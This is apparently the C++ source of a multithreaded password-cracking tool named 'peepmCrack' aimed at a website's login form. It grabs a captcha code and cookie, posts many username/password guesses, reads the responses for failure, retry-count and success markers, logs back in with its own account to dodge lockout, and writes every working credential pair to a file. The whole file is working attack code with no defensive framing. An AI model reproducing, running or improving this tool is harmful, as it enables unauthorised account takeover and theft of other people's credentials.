#include "StdAfx.h"
#include "peepmCrack.h"
#include "peepmUtil.h"

CpeepmCrack::CpeepmCrack(UINT id, UINT threadMax, DWORD delay, CCriticalSection* section, CEvent* event, PeepmWrite* peepmWrite, CpeepmUI& peepmUI) : m_PeepmUI(peepmUI)
{
	m_Id = id;
	m_ThreadMax = threadMax;
	m_Delay = delay;
	m_Section = section;
	m_Event = event;	
	m_PeepmWrite = peepmWrite;
	m_Thread = NULL;
	m_Stop = FALSE;
	m_Stoped = FALSE;
	m_Pause = FALSE;
	m_Request.buffer = NULL;
	m_Request.dataLength = 0;
	m_Request.bufferLength = 0;
	m_Request.cookie = NULL;
	m_Request.code = NULL;
	m_Response.chunked = 0;
	m_Response.buffer = NULL;
	m_Response.dataLength = 0;
	m_Response.bufferLength = 0;
	m_Response.head = NULL;
	m_Response.headLength = 0;
	m_Response.body = NULL;
	m_Response.bodyLength = 0;	
}

CpeepmCrack::~CpeepmCrack()
{
	
}

BOOL CpeepmCrack::InitSocket()
{
	struct hostent* host = gethostbyname(Server);
	if (host != NULL)
	{		
		CopyMemory(&m_Request.addr.sin_addr, host->h_addr_list[0], host->h_length);
		m_Request.addr.sin_family = AF_INET;		
		m_Request.addr.sin_port = htons(Port);
		return TRUE;
	}
	else
		return FALSE;
}

BOOL CpeepmCrack::ConnectSocket()
{		
	while (!m_Stop)
	{
		Sleep(5);
		m_Request.socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (m_Request.socket == INVALID_SOCKET)
		{
			m_PeepmUI.OnThreadConnect(m_Id, FALSE);
			continue;
		}

		int error = connect(m_Request.socket, (SOCKADDR *)&m_Request.addr, sizeof(SOCKADDR_IN));
		if (error == SOCKET_ERROR)
		{
			m_PeepmUI.OnThreadConnect(m_Id, FALSE);
			continue;
		}
		else
		{
			m_PeepmUI.OnThreadConnect(m_Id, TRUE);
			return TRUE;
		}
	}

	return FALSE;
}

BOOL CpeepmCrack::GetCode()
{
	m_Request.dataLength = 0;

	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, Get, strlen(Get));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, Code, strlen(Code));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, Http, strlen(Http));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, Accept, strlen(Accept));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, Cache, strlen(Cache));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, UserAgent, strlen(UserAgent));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, Connection, strlen(Connection));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, Close, strlen(Close));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, Host, strlen(Host));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, Server, strlen(Server));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, "\r\n\r\n", 4);

	while (TRUE)
	{
		if (!Send())
		{
			if (!ConnectSocket())
				break;

			continue;
		}

		if (!Receive())
		{
			if (!ConnectSocket())
				break;

			continue;
		}

		if (GetCookie() && m_PeepmUI.OnThreadCode(m_Id, m_Request, m_Response))
			return TRUE;
		else
			break;
	}

	return FALSE;
}

BOOL CpeepmCrack::GetUrlContent(char* url, const char* cookie)
{
	char* p = strstr(url, Server);
	if (p == NULL)
		return FALSE;

	p += strlen(Server);
	UINT len = strlen(p);
	if (len == 0)
		return FALSE;

	m_Request.dataLength = 0;

	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, Get, strlen(Get));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, p, len);
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, Http, strlen(Http));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, Accept, strlen(Accept));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, Cache, strlen(Cache));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, UserAgent, strlen(UserAgent));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, Connection, strlen(Connection));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, KeepAlive, strlen(KeepAlive));	
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, Host, strlen(Host));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, Server, strlen(Server));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, "\r\n", 2);
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, Cookie, strlen(Cookie));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, cookie, strlen(cookie));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, "\r\n\r\n", 4);

	while (TRUE)
	{
		if (!Send())
		{
			if (!ConnectSocket())
				break;

			continue;
		}

		if (!Receive())
		{
			if (!ConnectSocket())
				break;

			continue;
		}

		return TRUE;
	}

	return FALSE;
}

BOOL CpeepmCrack::GetCookie()
{
	char* head = m_Response.head;	
	UINT length = m_Response.headLength;

	char* p = strstr(head, SetCookie);
	if (p == NULL)
		return FALSE;

	UINT len = p - head;
	if (len > length)
		return FALSE;

	p += strlen(SetCookie);
	char* q = p;
	while (TRUE)
	{
		if (*p == ';' || *p == '\r' || *p == '\n')
			break;

		p++;
	}

	if (p > q)
	{
		len = p - q;
		char* cookie = new char[len + 1];
		ZeroMemory(cookie, len + 1);
		CopyMemory(cookie, q, len);
		m_Request.cookie = cookie;
		return TRUE;
	}

	return FALSE;
}

const Response& CpeepmCrack::GetReponse()
{
	return m_Response;
}

char* CpeepmCrack::GetCookies()
{
	char* head = m_Response.head;	
	UINT length = m_Response.headLength;
	char* p = head;
	char* cookie = NULL;
	UINT dataLength = 0;
	UINT bufferLength = 0;
	
	while (TRUE)
	{
		p = strstr(p, SetCookie);
		if (p == NULL)
			break;

		UINT len = p - head;
		if (len > length)
			break;

		p += strlen(SetCookie);
		char* q = p;
		while (TRUE)
		{
			if (*p == ';' || *p == '\r' || *p == '\n')
				break;

			p++;
		}

		if (p > q)
		{
			len = p - q;
			char* c = strstr(q, "=deleted;");
			if (c != NULL && c - q < len)
				continue;

			if (dataLength > 0)
				CpeepmUtil::AppendBuffer(&cookie, dataLength, bufferLength, "; ", 2);

			CpeepmUtil::AppendBuffer(&cookie, dataLength, bufferLength, q, len);			
		}
		else
			break;
	}

	return cookie;
}

BOOL CpeepmCrack::Send()
{
	char* buffer = m_Request.buffer;
	UINT length = m_Request.dataLength;
	UINT left = 0;

	while (left < length)
	{
		int ret = send(m_Request.socket, buffer + left, length - left, 0);
		if (ret <= 0)
		{
			closesocket(m_Request.socket);
			return FALSE;
		}

		left += ret;
	}

	return TRUE;
}

BOOL CpeepmCrack::Receive() 
{
	ZeroMemory(m_Response.code, sizeof(m_Response.code));
	m_Response.chunked = 0;
	m_Response.dataLength = 0;
	m_Response.head = NULL;
	m_Response.headLength = 0;
	m_Response.body = NULL;
	m_Response.bodyLength = 0;

	char buffer[4096] = {0};	
	int ret = 0;
	BOOL finish = FALSE;

	fd_set fd;
	TIMEVAL tv = {10, 0};

	FD_ZERO(&fd);
	FD_SET(m_Request.socket, &fd);
	
	do 
	{
		ret = select(0, &fd, NULL, NULL, &tv);
		if (ret > 0)
		{
			ret = recv(m_Request.socket, buffer, sizeof(buffer), 0);
			if (ret > 0)
			{			
				CpeepmUtil::AppendBuffer(&m_Response.buffer, m_Response.dataLength, m_Response.bufferLength, buffer, ret);
				finish = ParseHead();
				if (!finish)
					finish = ParseBody();
			}
		}
		else
		{
			m_PeepmUI.OnThreadInfo(m_Id, "½ÓÊÕ³¬Ê±");
			break;
		}
	} while (ret > 0 && !finish);

	if (ret <= 0)
	{		
		closesocket(m_Request.socket);
		return FALSE;
	}

	if (finish)
		return TRUE;

	if (m_Response.headLength > 0)
	{
		UINT len = m_Response.headLength + 4;
		if (m_Response.body == NULL)
			m_Response.body = m_Response.head + len;

		if (m_Response.bodyLength == 0)												
			m_Response.bodyLength = m_Response.dataLength - len;				 

		return TRUE;
	}

	closesocket(m_Request.socket);
	ZeroMemory(m_Response.code, sizeof(m_Response.code));
	m_Response.chunked = 0;
	m_Response.dataLength = 0;
	m_Response.head = NULL;
	m_Response.headLength = 0;
	m_Response.body = NULL;
	m_Response.bodyLength = 0;
	return FALSE;
}

BOOL CpeepmCrack::ParseHead()
{
	m_Response.head = m_Response.buffer;
	if (m_Response.headLength == 0)
	{
		char* head = m_Response.head;
		UINT len = m_Response.dataLength;
		char* p = strstr(head, "\r\n\r\n");
		if (p == NULL || p - head + 4 > len)
			return FALSE;

		len = p - head;
		m_Response.head = head;
		m_Response.headLength = len;
		char* c = head + 9;
		CopyMemory(m_Response.code, c, 3);
	}

	if (m_Response.bodyLength == 0)
	{
		char* head = m_Response.head;
		UINT len = m_Response.headLength;		
		char* p = strstr(head, Chunked);
		if (p != NULL && p - head + strlen(Chunked) < len)
		{
			UINT total = m_Response.dataLength;
			if (len + 7 <= total)
			{
				p = head + len + 4;
				const char* q = strstr(p, "\r\n");
				if (q - p > 0 && q - head + 2 <= total)
				{
					len = q - p;
					char* length = new char[len + 1];
					ZeroMemory(length, len + 1);
					CopyMemory(length, p, len);
					m_Response.bodyLength = strtol(length, NULL, 16);					
					ReleaseArray(length);
					m_Response.chunked = len + 2;
					if (m_Response.bodyLength == 0)
						return TRUE;
				}
			}

			return FALSE;
		}

		p = strstr(head, ContentLength);
		if (p != NULL && p - head + strlen(ContentLength) < len)
		{
			p += strlen(ContentLength);
			const char* q = strstr(p, "\r\n");			
			if (q > p)
			{
				len = q - p;
				char* length = new char[len + 1];
				ZeroMemory(length, len + 1);
				CopyMemory(length, p, len);
				m_Response.bodyLength = atoi(length);
				ReleaseArray(length);
				if (m_Response.bodyLength == 0)
					return TRUE;
			}
		}
	}

	return FALSE;
}

BOOL CpeepmCrack::ParseBody()
{
	char* head = m_Response.head;
	UINT size = m_Response.dataLength;
	UINT len = m_Response.headLength;
	if (len == 0)
		return FALSE;

	len += 4;
	if (m_Response.bodyLength == 0)
	{		
		if (size > len)		
			m_Response.body = head + len;		
	}
	else
	{

		UINT chunked = m_Response.chunked;
		m_Response.body = head + len + chunked;

		if (chunked == 0)
		{			
			if (len + m_Response.bodyLength == size)
				return TRUE;
		}
		else
		{
			if (len + chunked + m_Response.bodyLength + 7 == size)
				return TRUE;
		}
	}

	return FALSE;
}

void CpeepmCrack::WritePassword(const char* username, const char* password)
{	
	CCriticalSection* lock = m_PeepmWrite->lock;
	char* writePath = m_PeepmWrite->writePath;
	if (!lock->Lock())
		return;

	FILE* file = fopen(writePath, "a+");	
	fwrite(username, strlen(username), 1, file);
	fwrite("\t", 1, 1, file);
	fwrite(password, strlen(password), 1, file);
	fwrite("\r\n", 2, 1, file);
	fclose(file);

	lock->Unlock();
}

UINT CpeepmCrack::GetLogin(const char* username, const char* password, BOOL write)
{
	char* cookie = m_Request.cookie;
	char* code = m_Request.code;

	char* body = NULL;
	UINT dataLength = 0;
	UINT bufferLength = 0;
	char* u = CpeepmUtil::UrlEncode(username, strlen(username));
	if (u == NULL)
		return 3;

	char* p = CpeepmUtil::UrlEncode(password, strlen(password));
	if (p == NULL)
	{
		ReleaseArray(u);
		return 3;
	}

	CpeepmUtil::AppendBuffer(&body, dataLength, bufferLength, Username, strlen(Username));
	CpeepmUtil::AppendBuffer(&body, dataLength, bufferLength, u, strlen(u));
	CpeepmUtil::AppendBuffer(&body, dataLength, bufferLength, "&", 1);
	CpeepmUtil::AppendBuffer(&body, dataLength, bufferLength, Password, strlen(Password));
	CpeepmUtil::AppendBuffer(&body, dataLength, bufferLength, p, strlen(p));
	CpeepmUtil::AppendBuffer(&body, dataLength, bufferLength, "&", 1);
	CpeepmUtil::AppendBuffer(&body, dataLength, bufferLength, Expire, strlen(Expire));
	CpeepmUtil::AppendBuffer(&body, dataLength, bufferLength, "2&", 2);	
	CpeepmUtil::AppendBuffer(&body, dataLength, bufferLength, Codes, strlen(Codes));
	CpeepmUtil::AppendBuffer(&body, dataLength, bufferLength, code, strlen(code));

	ReleaseArray(u);
	ReleaseArray(p);

	char buffer[64] = {0};
	sprintf(buffer, "%d", dataLength);

	m_Request.dataLength = 0;

	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, Post, strlen(Post));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, Login, strlen(Login));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, Http, strlen(Http));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, Accept, strlen(Accept));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, ContentType, strlen(ContentType));	
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, Connection, strlen(Connection));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, KeepAlive, strlen(KeepAlive));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, Cache, strlen(Cache));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, Host, strlen(Host));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, Server, strlen(Server));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, "\r\n", 2);
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, ContentLength, strlen(ContentLength));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, buffer, strlen(buffer));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, "\r\n", 2);
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, Cookie, strlen(Cookie));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, cookie, strlen(cookie));
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, "\r\n\r\n", 4);
	CpeepmUtil::AppendBuffer(&m_Request.buffer, m_Request.dataLength, m_Request.bufferLength, body, dataLength);

	ReleaseArray(body);

	while (TRUE)
	{
		if (!Send())
		{
			if (!ConnectSocket())
				break;

			continue;
		}

		if (!Receive())
		{
			if (!ConnectSocket())
				break;
			
			continue;
		}
		
		UINT length = m_Response.bodyLength;
		if (length > 0)
		{
			char* content = m_Response.body;
			char* p = strstr(content, CodeError);
			if (p != NULL)
			{
				ReleaseArray(m_Request.cookie);
				ReleaseArray(m_Request.code);
				return 2;
			}

			p = strstr(content, LoginFail);
			if (p != NULL)
			{
				int times = GetTimes();
				if (times == 1)						
					ReLogin();

				return 1;
			}

			p = strstr(content, LoginSuccess);
			if (p != NULL)
			{
				if (write)
				{
					WritePassword(username, password);
					m_PeepmUI.OnThreadSuccess(username, password);
				}

				return 0;
			}

			char* c = m_Response.code;
			if (strcmp(c, "500") == 0)
				continue;
		}	

		m_PeepmUI.OnThreadLogin(m_Id, 3);
		m_PeepmUI.OnThreadInfo(m_Id, m_Response.buffer);
		return 3;
	}

	return 1;
}

char* CpeepmCrack::AppendPassword(const char* username, const char* password)
{
	UINT len = strlen(username) + strlen(password);
	char* p = new char[len + 1];
	ZeroMemory(p, len + 1);
	strcat(p, username);
	strcat(p, password);
	return p;
}

void CpeepmCrack::ReLogin()
{
	m_PeepmUI.OnThreadReLogin(m_Id);
	GetLogin(MyUsername, MyPassword, FALSE);
}

int CpeepmCrack::GetTimes()
{
	char* content = m_Response.body;
	UINT length = m_Response.bodyLength;

	char* p = strstr(content, LoginRetry);
	if (p != NULL)
	{
		p += strlen(LoginRetry);
		char* q = p;
		while (q - content < length)
		{
			if (*q < '0' || *q > '9')
				break;
			else
				q++;
		}

		UINT len = q - p;
		if (len > 0)
		{
			char* tmp = new char[len + 1];
			ZeroMemory(tmp, len + 1);
			CopyMemory(tmp, p, len);
			int times = atoi(tmp);
			ReleaseArray(tmp);
			return times;
		}
	}

	m_PeepmUI.OnThreadErrorTimes(m_Id);
	return -1;
}

CEvent* CpeepmCrack::GetEvent()
{
	return m_Event;
}

UINT CpeepmCrack::GetThreadMax()
{
	return m_ThreadMax;
}

CWinThread* CpeepmCrack::GetThread()
{
	return m_Thread;
}

void CpeepmCrack::SetThread(CWinThread* thread)
{
	m_Thread = thread;
}

void CpeepmCrack::Stop()
{
	m_Stop = TRUE;
}

void CpeepmCrack::SetPause(BOOL pause)
{
	m_Pause = pause;
	if (pause)	
		m_PeepmUI.OnThreadInfo(m_Id, "ÔÝÍ£");
	else
		m_PeepmUI.OnThreadInfo(m_Id, "»Ö¸´");
}

void CpeepmCrack::SetDelay(DWORD delay)
{
	m_Delay = delay;
	m_PeepmUI.OnThreadDelay(m_Id, delay);
}

void CpeepmCrack::Release()
{	
	if (m_PeepmWrite != NULL)
	{
		ReleaseObject(m_PeepmWrite->lock);
		ReleaseArray(m_PeepmWrite->writePath);
		ReleaseObject(m_PeepmWrite);
	}
	
	ReleaseObject(m_Event);
	ReleaseObject(m_Section);
	OnRelease();
}

void CpeepmCrack::OnStart()
{
	while (!m_Stop)
	{
		DWORD dw = WaitForSingleObject(m_Event->m_hObject, 100);
		if (dw == WAIT_TIMEOUT)
			continue;

		if (dw == WAIT_OBJECT_0)
			break;
	}

	m_PeepmUI.OnThreadStart(m_Id);
	if (OnStarted())
	{
		while (!m_Stop)
		{
			if (m_Pause)
			{
				Sleep(2000);
				continue;
			}

			Sleep(m_Delay);
			if (!OnProgress())
				break;
		}

		closesocket(m_Request.socket);	
		ReleaseArray(m_Request.buffer);
		ReleaseArray(m_Request.code);
		ReleaseArray(m_Request.cookie);
		ReleaseArray(m_Response.buffer);
	}
	
	OnStoped();
	m_PeepmUI.OnThreadFinish(m_Id);
}

UINT CpeepmCrack::OnThread(LPVOID param)
{
	CpeepmCrack* crack = (CpeepmCrack *)param;
	crack->OnStart();
	return 1;
}
